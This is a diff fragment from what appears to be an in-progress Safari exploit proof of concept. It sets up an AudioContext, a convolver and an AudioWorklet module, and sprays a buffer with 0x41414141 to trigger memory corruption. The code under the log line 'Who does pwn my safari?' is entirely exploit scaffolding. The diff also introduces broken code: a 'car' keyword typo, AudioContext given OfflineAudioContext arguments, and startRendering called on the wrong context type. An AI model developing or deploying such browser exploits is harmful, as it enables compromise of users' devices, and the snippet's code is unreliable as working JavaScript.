@@ -124,8 +124,9 @@
         }
         async function main(){
             log("Who does pwn my safari?");
-		const OfflineAudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
-            let audioCtx = new OfflineAudioContext(1,0x100000,44100);
+		car AudioContext = window.AudioContext || window.webkitAudioContext;
+		var OfflineAudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
+            let audioCtx = new AudioContext(1,0x100000,44100);
 		//new OfflineAudioContext({numberOfChannels: 1, length: 0x100000, sampleRate: 44100});
 		//const ConvolverNode = window.ConvolverNode || window.webkitConvolverNode;
             let outputBufferSrc = audioCtx.createConvolver();
@@ -143,7 +144,7 @@
             inputBufferU32.fill(0x41414141);
 
             console.log(audioCtx.audioWorklet)
-            await audioCtx.audioWorklet.addModule('14.5.js').then(() => {
+            await audioCtx.audioWorklet.addModule('14.5.js')
             //alert();
             //await sleep(1000);
             let originNode = new AudioWorkletNode(audioCtx, 'OrigineWorklet',{numberOfInputs:0, numberOfOutputs:1});
@@ -188,7 +189,6 @@
             */
             //originNode2.connect(audioCtx.destination);
             audioCtx.startRendering();
-	    })
             //alert("fuck");
 
         }
